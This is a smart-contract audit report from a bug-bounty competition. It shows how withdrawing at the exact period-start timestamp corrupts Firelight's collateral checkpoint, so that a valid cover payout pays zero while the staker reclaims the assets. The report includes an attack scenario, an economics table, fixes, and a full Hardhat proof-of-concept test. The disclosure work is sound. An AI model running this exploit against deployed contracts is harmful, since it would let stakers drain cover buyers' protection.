# 89946 sc high period start withdrawal corrupts collateral accounting allowing settled cover to pay zero while the staker reclaims slashable assets

**Submitted on Aug 22nd 2026 at 02:25:29 UTC by @sftwr for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89946
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

A permissionless staker can order a withdrawal after the allocator's commitment in a block whose timestamp exactly equals the new period start. `commitAllocation()` stores the pre-withdrawal 100-unit matching capacity, but the later withdrawal writes the post-withdrawal asset total at the same period-start checkpoint key. Settlement does not revalidate vault capacity and therefore mints 100 units of cover and collects the premium. During a later valid incident, `payout()` includes the 100 pending-withdrawal assets in `activePayableAmount` but independently caps payment by the corrupted `totalAssetsAt(periodStart) == 0`. The beneficiary receives zero, the incident closes, and the staker later claims all 100 assets.

## Impact

A staker can remove up to all of the vault collateral that was just committed to a cover period from the payout cap without removing it from the already-committed matching capacity. After normal settlement:

* the buyer pays the premium;
* the Cover NFT records the full allocation;
* the withdrawal assets remain inside the vault and are nominally included in `activePayableAmount`;
* a valid payout is nevertheless capped by the corrupted `assetsAtCapturePeriod`;
* after the withdrawal window, the staker claims the assets that should have been slashed.

In the PoC, 100 assets support and settle 100 units of cover. The exploit makes the valid 100-asset payout return zero and lets the staker later claim all 100 assets. The strongest same-state control changes only the withdrawal timestamp from the boundary second to one second later; it pays the full 100 and leaves the staker with zero.

This is not merely a historical-view mismatch. The corrupted historical value crosses into both committed cover capacity and executable payout accounting, causing settled liabilities to exceed assets that the payout path is willing to slash.

## Root cause

Three individually reasonable mechanisms compose unsafely:

1. `commitAllocation` validates capacity from `vault.totalAssetsAt(vault.currentPeriodStart())` and freezes the caller's `matchingCapacity` in the commitment ([CoverOrderAllocator.sol, capacity read](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L696-L724), [commit storage](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L332-L356)).
2. Every withdrawal writes the post-withdrawal asset total under `Time.timestamp()` ([FirelightVault.sol](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L755-L775), [trace write](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1044-L1056)). A transaction in a block whose timestamp equals the boundary therefore writes directly to the period-start key and rewrites the historical view used for that period.
3. Settlement trusts the stored commitment and does not revalidate vault capacity ([CoverOrderAllocator.sol](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L457-L539)), while `payout` independently rereads the now-lower period-start value as an exposure cap ([FirelightVault.sol](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L900-L927)).

The generic checkpoint library also replaces a checkpoint when its timestamp key equals the latest key ([Checkpoints.sol](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L198-L214)). The exploit does not require a pre-existing boundary checkpoint, however: appending the first post-withdrawal checkpoint at the exact start timestamp is already enough for `upperLookupRecent(periodStart)` to return the wrong state.

## Attack scenario

1. A permissionless staker has 100 FXRP active in the vault. A buyer has a pending 100-USD cover order for the next period.
2. In the first block of that period, the authorized allocator submits its normal commitment. Capacity validation reads 100 assets at `currentPeriodStart`, and the commitment stores 100.
3. The staker backruns that public transaction in the same block and requests withdrawal of all 100 assets. Because both transactions have the period-start timestamp, `_logTrace` writes zero at the period-start key and makes `totalAssetsAt(periodStart)` equal zero. The 100 assets remain physically in the vault as a pending withdrawal.
4. After the configured eight-hour grace, the authorized allocator normally settles the committed order. The buyer pays the premium and receives a Cover NFT allocating 100 cover.
5. A covered incident occurs later in the period and the ordinary curator and assessment-approver path approves a 100-asset loss.
6. `activePayableAmount` includes the 100 pending assets, but `assetsAtCapturePeriod` is zero, so `paidAmount` is zero. `IncidentManager` accepts the zero vault payment and closes the incident, leaving no normal automatic retry path ([approval and closure](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/IncidentManager.sol#L402-L438), [payout execution](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/IncidentManager.sol#L672-L705)).
7. At the end of the withdrawal window, the staker claims all 100 assets.

The staker must initiate the boundary withdrawal before settlement, but can wait until settlement reveals the covered market before deciding whether to trigger or participate in an external incident. If no attractive opportunity appears, their Firelight action remains an ordinary delayed withdrawal.

## Same-state control and economics

| Item                                          | Shared pre-state | Exploit: withdrawal later in boundary block | Strongest control: withdrawal at `start + 1 second` |
| --------------------------------------------- | ---------------: | ------------------------------------------: | --------------------------------------------------: |
| Active vault assets before boundary           |              100 |                                         100 |                                                 100 |
| Committed matching capacity                   |                — |                                         100 |                                                 100 |
| Settled cover / premium paid                  |                — |                                   100 / yes |                                           100 / yes |
| `totalAssetsAt(periodStart)` after withdrawal |                — |                                           0 |                                                 100 |
| Valid requested payout                        |                — |                                         100 |                                                 100 |
| Actual payout                                 |                — |                                           0 |                                                 100 |
| Staker's final recovered assets               |                — |                                         100 |                                                   0 |
| Incremental beneficiary shortfall             |                — |                                     **100** |                                                   0 |
| Incremental staker wealth                     |                — |                                    **+100** |                                                   0 |

The staked 100 is present in both branches and is not an exploit-only setup cost. Incremental execution cost is one ordinary withdrawal transaction plus any ordering fee. If the staker is part of the group exploiting the covered market, the external exploit supplies the incident and profit while this bug preserves the entire stake that the protocol should slash. There is no donation, oracle manipulation, privileged key, or loss-making capital cycle.

The zero first-loss-buffer balance isolates the vault leg and is not counted toward the committed capacity. A funded buffer could pay its own portion, but it would not restore the vault contribution erased by the corrupted period-start snapshot.

## Reachability and limitations

* Firelight documents that matching runs at period boundaries and that withdrawals initiated during a period remain slashable for incidents in that period. See [How Firelight Works](https://docs.firelight.finance/introduction/how-firelight-works) and [Deployments and Withdrawals](https://docs.firelight.finance/for-stakers/deployments-and-withdrawals).
* Flare targets approximately 1.8-second block times ([official network overview](https://dev.flare.network/network/overview)). The relevant condition is not a one-second cadence, but a block whose integer timestamp exactly equals `periodStart`. Read-only verification found block `67921346` at timestamp `1787319769`, exactly the then-current Phase 1 vault boundary. This shows that an exact-boundary block is an ordinary chain state, not a locally fabricated timestamp.
* The attacker's withdrawal must be the final relevant vault-asset checkpoint written at the period-start timestamp, or a later same-timestamp write must leave the snapshot below committed exposure. A subsequent deposit or reward checkpoint at the same timestamp could otherwise replace the checkpoint again.
* The operator can cancel or recommit during the grace window if it detects the changed snapshot before any order settles. This is a manual monitoring/recovery path, not an on-chain prevention. Once any settlement starts, `_replaceableCommitment` rejects cancellation/recommitment, and later checkpoints cannot rewrite the historical start key.
* The approved assessment path does not recover automatically from the zero vault payment: `IncidentManager` permits the zero payment and still closes the incident. Restoring accounting or upgrading the vault afterward therefore does not reopen the unpaid claim through the normal on-chain lifecycle.
* A blocklist/rescue response can stop or redirect an identified staker's eventual claim, but it does not restore the zero payout cap or automatically compensate the already-paid cover buyer. An upgrade or manual compensation is still required after settlement.
* The exact boundary-block backrun is the strongest dismissal and is why High is the honest fallback. It is nevertheless rationally reachable: boundaries are deterministic, allocator commitments are public transactions expected at the boundary, the proposer determines transaction ordering under Flare's default priority-gas-auction model, an exact-boundary block exists on-chain, and the attacker needs no cooperation from a privileged role.

## Duplicate and scope posture

* `FirelightVault.sol`, `CoverOrderAllocator.sol`, and the checkpoint library are explicitly in scope, and commitment correctness, capacity/solvency constraints, and payout accounting are named priority areas.
* Phase 2 is intended for deployment as the upgrade/new-contract set; the competition explicitly covers the frozen `v1_audit_ready` code before deployment.
* The July 29 Macro report does not disclose this same-timestamp commitment/checkpoint/payout composition. Its public findings cover leverage/CAR, settlement batching, zero-share deposits, concentration updates, grace bounds, reward checkpointing, and related administrative issues.
* Duplicate Bug submissions remain valid until a fix is public. A submission fee is shown only at submission time.

## Recommendation

Do not derive an immutable period-start exposure from a timestamp trace that can still accept writes at that timestamp.

Prefer one of these approaches:

1. Pin a dedicated `assetsAtPeriodStart[period]` exactly once during capacity commitment and make both commitment validation and payout consume that same immutable value.
2. Define boundary actions as intra-period activity and read the latest checkpoint strictly before `periodStart` (not `<= periodStart`) for both capacity and payout.
3. At minimum, bind the committed Merkle root to the exact vault exposure value/hash and require payout to use that committed exposure rather than independently rereading mutable history.

Add regression tests for both transaction orders in a single boundary block and for the `start + 1 second` control.

## Proof of Concept

## Proof of Concept

### Pinned baseline

* Repository: `https://github.com/immunefi-team/audit-comp-firelight`
* Branch: `v1_audit_ready`
* Commit: `42f9ea5e43d88b35197b901acc2a8c24b314fa62`
* Test path: `test/FirelightVault/periodStartWithdrawalCheckpoint.poc.js`
* PoC SHA-256: `b55ba4b3cd7c0b052c55f42f22f10aa68568d727a8c3cdfe9984e2bdf91927e2`

### Steps to reproduce

1. Check out the pinned commit.
2. Add the test below at the stated test path.
3. Install dependencies using the repository's ordinary setup path:

```bash
npm install
```

4. Run:

```bash
npx hardhat test test/FirelightVault/periodStartWithdrawalCheckpoint.poc.js
```

### Expected output

```
PoC: period-start withdrawal erases committed slashable exposure
  ✔ boundary-block withdrawal pays 0 and returns 100 to staker; t+1 pays 100 and returns 0

1 passing
```

The complete upstream suite also passes with `449 passing`.

The test uses the real `FirelightVault`, `CoverOrderAllocator`, `CoverNFT`, and `IncidentManager`. It executes commitment, boundary withdrawal, eight-hour grace, settlement, premium collection, Cover NFT minting, incident creation and confirmation, assessment submission and approval, payout, incident closure, and final withdrawal claim. Mocks are limited to the local premium ERC-20 and one-dollar price feed.

### Test file

```javascript
const { loadFixture, takeSnapshot, time } = require('@nomicfoundation/hardhat-network-helpers')
const { deployVault } = require('../setup/fixtures.js')
const { expect } = require('chai')
const { ethers, network, upgrades } = require('hardhat')
const { StandardMerkleTree } = require('@openzeppelin/merkle-tree')

const ASSET_DECIMALS = 6
const INITIAL_ASSETS = ethers.parseUnits('100', ASSET_DECIMALS)
const COVER_AMOUNT = ethers.parseUnits('100', 18)
const PERIOD_DURATION = 24 * 60 * 60
const SETTLEMENT_GRACE = 8 * 60 * 60
const INCIDENT_STATUS_CLOSED = 4n
const MARKET = ethers.encodeBytes32String('boundary-market')
const PROTOCOL = 'BoundaryProtocol'
const MARKET_ID = ethers.keccak256(
  ethers.AbiCoder.defaultAbiCoder().encode(['uint64', 'string', 'bytes32'], [1, PROTOCOL, MARKET])
)

async function fixture() {
  const ctx = await deployVault({
    decimals: ASSET_DECIMALS,
    initial_deposit_limit: INITIAL_ASSETS,
    period_configuration_duration: PERIOD_DURATION,
  })

  const staker = ctx.users[0]
  const buyer = ctx.users[1]
  const premiumCollector = ctx.users[2]
  await ctx.utils.mintAndApprove(INITIAL_ASSETS, staker)
  await ctx.firelight_vault.connect(staker).deposit(INITIAL_ASSETS, staker.address)

  const MockERC20 = await ethers.getContractFactory('MockERC20')
  const premiumToken = await MockERC20.deploy('Mock USD', 'mUSD', ASSET_DECIMALS)
  const MockAggregator = await ethers.getContractFactory('MockAggregatorV3')
  const priceFeed = await MockAggregator.deploy(18, ethers.parseUnits('1', 18))

  const CoverNFT = await ethers.getContractFactory('CoverNFT')
  const coverNFT = await upgrades.deployProxy(
    CoverNFT,
    ['Firelight Cover', 'FLCOVER', '', ctx.deployer.address, ctx.deployer.address, ethers.ZeroAddress, ethers.ZeroAddress],
    { kind: 'transparent' }
  )

  const Allocator = await ethers.getContractFactory('CoverOrderAllocator')
  const allocator = await upgrades.deployProxy(
    Allocator,
    [{
      vault: ctx.firelight_vault.target,
      premiumCollector: premiumCollector.address,
      coverNFT: coverNFT.target,
      priceFeedAdapter: priceFeed.target,
      maxPriceAge: 2 * PERIOD_DURATION,
      premiumTokens: [premiumToken.target],
      admin: ctx.deployer.address,
      adminRole: ctx.deployer.address,
      curatorRole: ctx.deployer.address,
      allocatorRole: ctx.deployer.address,
      configAdminRole: ctx.deployer.address,
      initialProtocolConcentrations: [{
        protocol: PROTOCOL,
        chainId: 1,
        maxProtocolConcentrationBps: 10_000,
      }],
      newMarkets: [{ chainId: 1, protocol: PROTOCOL, market: MARKET }],
      capacityConfig: {
        minCAR: 12_000,
        firstLossBufferToken: premiumToken.target,
        firstLossBuffer: ctx.deployer.address,
        effectiveLeverage: 12_000,
        minOrderMarketCoverAmount: 1,
        divergenceToleranceBps: 0,
      },
    }],
    { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] }
  )

  await coverNFT.connect(ctx.deployer).grantRole(ethers.id('MINTER_ROLE'), allocator.target)
  await allocator.connect(ctx.deployer).setSettlementGracePeriod(SETTLEMENT_GRACE)

  const IncidentManager = await ethers.getContractFactory('IncidentManager')
  const incidentManager = await upgrades.deployProxy(
    IncidentManager,
    [
      ctx.deployer.address,
      ctx.deployer.address,
      ctx.deployer.address,
      ctx.deployer.address,
      ctx.deployer.address,
      ctx.deployer.address,
      ctx.deployer.address,
      ctx.deployer.address,
      ctx.payout_receiver.address,
      allocator.target,
      priceFeed.target,
      2 * PERIOD_DURATION,
    ],
    { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] }
  )

  await ctx.firelight_vault
    .connect(ctx.deployer)
    .grantRole(await ctx.firelight_vault.PAYOUT_ROLE(), incidentManager.target)
  await ctx.firelight_vault
    .connect(ctx.deployer)
    .grantRole(await ctx.firelight_vault.INCIDENT_ROLE(), incidentManager.target)

  await premiumToken.mint(buyer.address, ethers.parseUnits('10', ASSET_DECIMALS))
  await premiumToken.connect(buyer).approve(allocator.target, ethers.MaxUint256)

  // Created in period 0 for period 1. Matching is committed at the period-1 boundary.
  await allocator.connect(ctx.deployer).createCoverOrder(
    buyer.address,
    buyer.address,
    buyer.address,
    premiumToken.target,
    [{ marketId: MARKET_ID, coverRateAnnual: 500, coverAmount: COVER_AMOUNT }],
    0
  )

  const allocation = [[MARKET_ID, COVER_AMOUNT]]
  const tree = StandardMerkleTree.of([[0n, allocation]], ['uint256', '(bytes32,uint256)[]'])

  return { ...ctx, allocator, incidentManager, buyer, staker, tree, allocation }
}

async function commitAndWithdrawAtBoundary(ctx, sameBlock) {
  const { allocator, deployer, firelight_vault: vault, staker, tree } = ctx
  const boundary = await vault.currentPeriodEnd()

  await network.provider.send('evm_setAutomine', [false])
  try {
    await network.provider.send('evm_setNextBlockTimestamp', [Number(boundary)])
    const commitTx = await allocator.connect(deployer).commitAllocation(1, tree.root, COVER_AMOUNT, COVER_AMOUNT, {
      gasLimit: 8_000_000,
    })

    let withdrawTx
    if (sameBlock) {
      withdrawTx = await vault.connect(staker).withdraw(INITIAL_ASSETS, staker.address, staker.address, {
        gasLimit: 8_000_000,
      })
    }

    await network.provider.send('evm_mine')
    const commitReceipt = await commitTx.wait()
    let withdrawReceipt

    if (sameBlock) {
      withdrawReceipt = await withdrawTx.wait()
    } else {
      await network.provider.send('evm_setAutomine', [true])
      await time.setNextBlockTimestamp(boundary + 1n)
      withdrawReceipt = await (
        await vault.connect(staker).withdraw(INITIAL_ASSETS, staker.address, staker.address)
      ).wait()
    }

    return { boundary, commitReceipt, withdrawReceipt }
  } finally {
    await network.provider.send('evm_setAutomine', [true])
  }
}

async function settleCover(ctx, boundary) {
  const { allocator, deployer, tree, allocation } = ctx
  await time.increaseTo(boundary + BigInt(SETTLEMENT_GRACE))
  await allocator.connect(deployer).settleCoverOrder(
    0,
    allocation.map(([marketId, allocatedCover]) => ({ marketId, allocatedCover })),
    tree.getProof(0)
  )
  expect((await allocator.getCoverOrder(0)).allocatedCoverAmount).to.equal(COVER_AMOUNT)
}

async function executeIncidentPayout(ctx, captureTimestamp, expectedPaidAmount) {
  const { deployer, firelight_vault: vault, incidentManager, payout_receiver: payoutReceiver } = ctx

  await incidentManager
    .connect(deployer)
    .createIncident(captureTimestamp, 'Boundary incident', ethers.id('boundary-incident'))
  await incidentManager.connect(deployer).confirmIncident(1, 'ipfs://boundary-incident')
  await incidentManager.connect(deployer).addAssessmentLosses(1, [
    { coverTokenId: 0, marketId: MARKET_ID, amount: COVER_AMOUNT },
  ])
  await incidentManager.connect(deployer).submitCurrentAssessment(1)

  const approval = await incidentManager.connect(deployer).approveCurrentAssessment(1)
  await expect(approval)
    .to.emit(vault, 'PayoutExecuted')
    .withArgs(payoutReceiver.address, INITIAL_ASSETS, expectedPaidAmount, captureTimestamp)
    .and.to.emit(incidentManager, 'IncidentClosed')
    .withArgs(1, expectedPaidAmount, COVER_AMOUNT)

  const [incident, exists] = await incidentManager.getIncident(1)
  expect(exists).to.equal(true)
  expect(incident.status).to.equal(INCIDENT_STATUS_CLOSED)
  expect(incident.vaultPaidAmount).to.equal(expectedPaidAmount)
}

describe('PoC: period-start withdrawal erases committed slashable exposure', function () {
  it('boundary-block withdrawal pays 0 and returns 100 to staker; t+1 pays 100 and returns 0', async function () {
    const ctx = await loadFixture(fixture)
    const { allocator, firelight_vault: vault, token_contract: asset, payout_receiver, staker } = ctx
    const beforeBoundary = await takeSnapshot()

    // Exploit: the normal allocator commits against the 100-asset start state.
    // A later transaction at that exact timestamp withdraws all shares and writes
    // zero at the period-start checkpoint key. Settlement still uses the stored 100
    // capacity, while payout later reads the overwritten zero cap.
    const exploit = await commitAndWithdrawAtBoundary(ctx, true)
    expect(exploit.commitReceipt.blockNumber).to.equal(exploit.withdrawReceipt.blockNumber)
    expect(exploit.commitReceipt.index).to.be.lessThan(exploit.withdrawReceipt.index)
    expect((await allocator.getAllocationCommitment(1)).totalAvailableCapacity).to.equal(COVER_AMOUNT)
    expect(await vault.totalAssetsAt(exploit.boundary)).to.equal(0n)

    await settleCover(ctx, exploit.boundary)
    const exploitCapture = BigInt(await time.latest())
    await executeIncidentPayout(ctx, exploitCapture, 0n)

    expect(await vault.withdrawalsOf(2, staker.address)).to.equal(INITIAL_ASSETS)
    expect(await vault.pendingWithdrawAssets()).to.equal(INITIAL_ASSETS)

    await time.increaseTo(exploit.boundary + 2n * BigInt(PERIOD_DURATION))
    await vault.connect(staker).claimWithdraw(2)
    expect(await asset.balanceOf(staker.address)).to.equal(INITIAL_ASSETS)
    expect(await asset.balanceOf(payout_receiver.address)).to.equal(0n)

    // Strongest same-state control: only the withdrawal ordering changes. At t+1,
    // the period-start view stays 100, so the same committed cover and same approved
    // incident slash all 100 assets from the pending withdrawal.
    await beforeBoundary.restore()

    const control = await commitAndWithdrawAtBoundary(ctx, false)
    expect(control.withdrawReceipt.blockNumber).to.be.greaterThan(control.commitReceipt.blockNumber)
    expect(await vault.totalAssetsAt(control.boundary)).to.equal(INITIAL_ASSETS)

    await settleCover(ctx, control.boundary)
    const controlCapture = BigInt(await time.latest())
    await executeIncidentPayout(ctx, controlCapture, INITIAL_ASSETS)

    expect(await vault.withdrawalsOf(2, staker.address)).to.equal(0n)
    expect(await vault.pendingWithdrawAssets()).to.equal(0n)
    expect(await vault.totalAssets()).to.equal(0n)
    expect(await asset.balanceOf(staker.address)).to.equal(0n)
    expect(await asset.balanceOf(payout_receiver.address)).to.equal(INITIAL_ASSETS)
  })
})
```
